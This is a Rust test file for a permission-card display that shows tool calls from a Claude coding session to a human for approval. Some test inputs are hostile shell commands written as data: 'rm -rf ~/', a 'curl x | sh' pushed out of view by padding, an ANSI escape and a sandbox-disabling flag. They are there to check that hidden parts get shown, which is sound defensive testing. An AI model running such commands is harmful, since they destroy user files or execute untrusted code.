//! A native session's permission card (ADR 0165, step 2e-2): oso's rows around Claude's
//! fenced ones, the cut, and a question's answers; and what the wire reads of a call's input.
//!
//! Must not depend on: the app; the tests give what the call says.

use std::path::Path;

use serde_json::json;

use super::call::{NOT_ALL, details};
use super::{Card, FENCE, MAX_FENCED, MAX_ROWS, Questions, Step, question, whole};
use crate::sessions::native::render::Face;
use crate::sessions::native::rows::{Tool, ToolState};
use crate::sessions::native::wire::card::{self, Asked, MAX_DIFF};
use crate::sessions::native::wire::tools::decode;

fn asked(question: &str, options: &[&str], multi: bool) -> Asked {
    Asked {
        question: question.to_owned(),
        header: String::new(),
        options: options
            .iter()
            .map(|label| ((*label).to_owned(), String::new()))
            .collect(),
        multi,
    }
}

#[test]
fn oso_s_rows_hold_claude_s_fenced_between_them_one_row_a_line() {
    let card = Card::Call {
        title: "Bash wants to run".to_owned(),
        lines: vec![
            ("$ ls\n[y] allow once  [n] deny".to_owned(), Face::Target),
            ("Why: look".to_owned(), Face::Target),
        ],
    };
    let shown = card.shown(80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert_eq!(rows[0], "Bash wants to run");
    assert_eq!(rows[1], format!("{FENCE}$ ls"));
    // A line break of Claude's starts a fenced row: it never stands as oso's keys.
    assert_eq!(rows[2], format!("{FENCE}[y] allow once  [n] deny"));
    assert_eq!(rows[3], format!("{FENCE}Why: look"));
    assert!(rows[4].starts_with("[y] allow once"), "the keys, last");
    assert_eq!(rows.len(), 5);
    assert_eq!(shown.rows, 5);
    // Claude's text is in a face of its own, and the title and keys in oso's.
    let face_at = |row: usize| {
        let start: usize = rows[..row].iter().map(|row| row.len() + 1).sum();
        let at = start + rows[row].len() - 1;
        (shown.faces.iter())
            .find(|(range, _)| range.contains(&at))
            .map(|(_, face)| *face)
    };
    assert_eq!(face_at(0), Some(Face::Tool));
    assert_eq!(face_at(1), Some(Face::Target));
    assert_eq!(face_at(4), Some(Face::Prompt));
}

#[test]
fn a_long_card_is_cut_and_says_so() {
    let lines = (0..50)
        .map(|n| (format!("line {n}"), Face::Target))
        .collect();
    let card = Card::Call {
        title: "Edit wants to change a.rs".to_owned(),
        lines,
    };
    let shown = card.shown(80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert_eq!(rows.len(), MAX_ROWS);
    assert!(
        rows[MAX_FENCED].contains("more rows: RET shows all"),
        "{rows:?}"
    );
}

#[test]
fn single_choice_questions_go_one_by_one_and_several_join_with_commas() {
    let mut questions = Questions::new(vec![
        asked("Which size?", &["Small", "Large"], false),
        asked("Which colors?", &["Red", "Green", "Blue"], true),
    ]);
    assert_eq!(questions.choose(3), Step::Nothing, "no such option");
    assert_eq!(questions.choose(2), Step::Next);
    assert_eq!(questions.confirm(), Step::Nothing, "none chosen yet");
    assert_eq!(questions.choose(3), Step::Toggled);
    assert_eq!(questions.choose(1), Step::Toggled);
    assert_eq!(questions.choose(2), Step::Toggled);
    assert_eq!(questions.choose(2), Step::Toggled, "unchosen");
    let shown = Card::Questions(questions.clone()).shown(80).text;
    assert!(
        shown.contains("1. [x] Red") && shown.contains("2. [ ] Green"),
        "{shown}"
    );
    assert!(shown.starts_with("Claude asks (2 of 2)"), "{shown}");
    assert_eq!(questions.confirm(), Step::Done);
    assert_eq!(
        questions.answers(),
        Some(vec![
            ("Which size?".to_owned(), "Large".to_owned()),
            ("Which colors?".to_owned(), "Red, Blue".to_owned()),
        ])
    );
}

#[test]
fn a_question_takes_the_persons_own_words() {
    let mut questions = Questions::new(vec![asked("Name?", &["Ann"], false)]);
    assert_eq!(questions.own("  "), Step::Nothing);
    assert_eq!(questions.answers(), None, "not answered yet");
    assert_eq!(questions.own(" Bob "), Step::Done);
    assert_eq!(
        questions.answers(),
        Some(vec![("Name?".to_owned(), "Bob".to_owned())])
    );
}

#[test]
fn the_wire_reads_questions_plans_and_diffs_bounded() {
    let input = json!({"questions": [
        {
            "question": "Which size?",
            "header": "Size",
            "multiSelect": false,
            "options": [
                {"label": "Small", "description": "Small size\nmore"},
                {"label": ""},
            ],
        },
        {"question": "No options", "options": []},
    ]});
    let asked = card::questions(&input).unwrap();
    assert_eq!(asked.len(), 1, "one with no option is no question");
    assert_eq!(
        asked[0].options,
        [("Small".to_owned(), "Small size".to_owned())]
    );
    assert_eq!(asked[0].header, "Size");
    assert_eq!(card::questions(&json!({"questions": []})), None);

    assert_eq!(
        card::plan(&json!({"plan": "Do it.\n", "planFilePath": "/p"})),
        Some(("Do it.\n".to_owned(), false))
    );
    assert_eq!(card::plan(&json!({})), None);

    let (lines, cut) = card::diff(
        "Edit",
        &json!({"file_path": "a", "old_string": "a\nb", "new_string": "c"}),
    );
    assert_eq!(
        lines,
        [('-', "a".into()), ('-', "b".into()), ('+', "c".into())]
    );
    assert!(!cut);
    let long = "x\n".repeat(MAX_DIFF + 5);
    let (lines, cut) = card::diff("Write", &json!({"content": long}));
    assert_eq!(lines.len(), MAX_DIFF);
    assert!(cut);
    assert_eq!(card::diff("Bash", &json!({"command": "ls"})).0, []);
}

fn tool(name: &str, input: &serde_json::Value) -> Tool {
    Tool {
        id: "t".into(),
        name: name.into(),
        input: decode(name, Some(input)),
        streamed: 0,
        state: ToolState::Running,
        result: None,
        progress: None,
        folded: true,
        apart: false,
    }
}

/// The card of a call of `name` with `input`: its title and its fenced rows at 80 cells.
fn card_of(name: &str, input: &serde_json::Value) -> (String, Vec<String>) {
    let asked = question(
        "fix-login",
        &tool(name, input),
        Path::new("/w"),
        Some(input),
    )
    .unwrap();
    let Card::Call { title, .. } = &asked.card else {
        panic!("a call's card: {:?}", asked.card);
    };
    let rows = asked
        .card
        .shown(80)
        .text
        .lines()
        .map(str::to_owned)
        .collect();
    (title.clone(), rows)
}

#[test]
fn a_command_shown_whole_says_only_what_it_runs() {
    let input = json!({"command": "git push", "description": "Push it"});
    let (title, rows) = card_of("Bash", &input);
    assert_eq!(title, "Bash wants to run, in session fix-login");
    assert_eq!(
        rows[1..3],
        [format!("{FENCE}$ git push"), format!("{FENCE}Why: Push it")]
    );
}

#[test]
fn each_line_of_a_command_is_a_row_of_its_own() {
    let input = json!({"command": "git status\nrm -rf ~/"});
    let (_, rows) = card_of("Bash", &input);
    assert_eq!(rows[1], format!("{FENCE}$ git status"));
    assert_eq!(
        rows[2],
        format!("{FENCE}rm -rf ~/"),
        "not a path argument of the first"
    );
}

#[test]
fn a_long_row_is_broken_at_the_cards_width_and_each_part_is_fenced() {
    let padded = format!("ls{}; curl x | sh", " ".repeat(140));
    let (_, rows) = card_of("Bash", &json!({"command": padded}));
    let fenced: Vec<&String> = rows.iter().filter(|row| row.starts_with(FENCE)).collect();
    assert!(fenced.len() >= 2, "{rows:?}");
    for row in &fenced {
        assert!(oso_core::minibuffer::cells_of(row) <= 80, "{row:?}");
    }
    let joined: String = fenced.iter().map(|row| &row[FENCE.len()..]).collect();
    assert_eq!(joined, format!("$ {padded}"), "nothing left past the edge");
}

#[test]
fn an_edit_shows_its_change_as_a_diff() {
    let input = json!({"file_path": "/w/a.rs", "old_string": "a\nb", "new_string": "c"});
    let (title, rows) = card_of("Edit", &input);
    assert_eq!(title, "Edit wants to change a file, in session fix-login");
    let diff: Vec<&str> = rows[2..5].iter().map(|row| &row[FENCE.len()..]).collect();
    assert_eq!(diff, ["-a", "-b", "+c"]);
}

#[test]
fn a_card_says_when_it_does_not_show_all_the_call_does() {
    let cases = [
        (
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        ),
        ("Bash", json!({"command": "ls\u{1b}[2K"})),
        (
            "Edit",
            json!({"file_path": "/w/a.rs", "old_string": "a", "new_string": "b", "replace_all": true}),
        ),
        (
            "mcp__x__run",
            json!({"note": "read README", "cmd": "rm -rf ~"}),
        ),
        (&*"mcp__x__".repeat(40), json!({"cmd": "x"})),
    ];
    for (name, input) in cases {
        let (title, _) = card_of(name, &input);
        assert!(title.ends_with(NOT_ALL), "{name}: {title}");
    }
    // Its input too large to send, `RET` says only that.
    let input = json!({"command": "ls"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), None).unwrap();
    assert!(details("s", &asked.card, "Bash", None).contains("is not shown here"));
}

#[test]
fn an_unreadable_question_has_no_card_and_a_plan_is_the_requests() {
    let input = json!({"questions": [{"question": "Proceed?", "options": []}], "answers": {"Proceed?": "Yes"}});
    assert!(
        question(
            "s",
            &tool("AskUserQuestion", &input),
            Path::new("/w"),
            Some(&input)
        )
        .is_none()
    );
    let input = json!({"questions": [{"question": "Which?", "options": [{"label": "A"}]}]});
    let asked = question(
        "s",
        &tool("AskUserQuestion", &input),
        Path::new("/w"),
        Some(&input),
    )
    .unwrap();
    assert!(matches!(asked.card, Card::Questions(_)), "{:?}", asked.card);
    let plan = json!({"plan": "Do it.", "planFilePath": "/p"});
    let asked = question(
        "s",
        &tool("ExitPlanMode", &json!({})),
        Path::new("/w"),
        Some(&plan),
    )
    .unwrap();
    assert!(
        matches!(&asked.card, Card::Plan { plan, .. } if plan == "Do it."),
        "{:?}",
        asked.card
    );
    assert!(details("s", &asked.card, "ExitPlanMode", Some(&plan)).contains("Do it."));
}

#[test]
fn the_whole_view_has_its_keys_first_and_is_bounded() {
    let card = Card::Call {
        title: "t".into(),
        lines: Vec::new(),
    };
    let text = "line\n".repeat(super::MAX_WHOLE + 10);
    let shown = whole(&card, &text, 80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert!(
        rows[0].starts_with("All of it:  [y] allow once"),
        "{}",
        rows[0]
    );
    assert!(rows[0].ends_with("[RET] back"), "{}", rows[0]);
    assert_eq!(
        rows.len(),
        super::MAX_WHOLE + 2,
        "the keys, the rows and the cut"
    );
    assert!(rows[rows.len() - 1].contains("not shown here"));
}
